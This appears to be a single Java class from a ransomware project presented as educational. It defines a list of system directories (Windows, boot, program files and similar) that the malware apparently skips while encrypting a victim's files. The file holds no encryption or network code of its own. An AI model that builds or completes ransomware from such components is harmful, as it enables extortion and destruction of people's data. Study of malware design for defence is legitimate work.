/********************************************************************
     _____                        _        _
    |_   _|                      | |      | |
      | |   ___ _ __   __ ____ _ | |  __  | | ____ _ _ __  ___
      | | /  _ ' |\ \ / //  _ ' || | /  \ | |/  _ ' | '__/  _  \
    __/ / | (_)  | \ V / | (_)  |\ V  /\ V  /| (_)  | |  |  ___/
   \__ /  \____,_|  \_/  \____,_| \__/ \__/  \____,_|_|  \_____|


 Copyright (c) 2019 Kyra Mozley
 Created on 05/08/19
 Version 2.0

 Disclaimer: This project is purely for educational purposes
 DO NOT RUN THIS ON YOUR PERSONAL MACHINE
 EXECUTE ONLY IN A TEST ENVIRONMENT
 DO NOT USE FOR MALICIOUS ACTIVITY

 *********************************************************************/
package RansomeWare;

import java.util.ArrayList;
import java.util.List;

public class AvoidedDir {
    public List<String> avoidDir = new ArrayList<>();

    public AvoidedDir() {
        avoidDir.add("windows");
        avoidDir.add("library");
        avoidDir.add("boot");
        avoidDir.add("local");
        avoidDir.add("program files");
        avoidDir.add("programdata");
        avoidDir.add("$");
    }
}
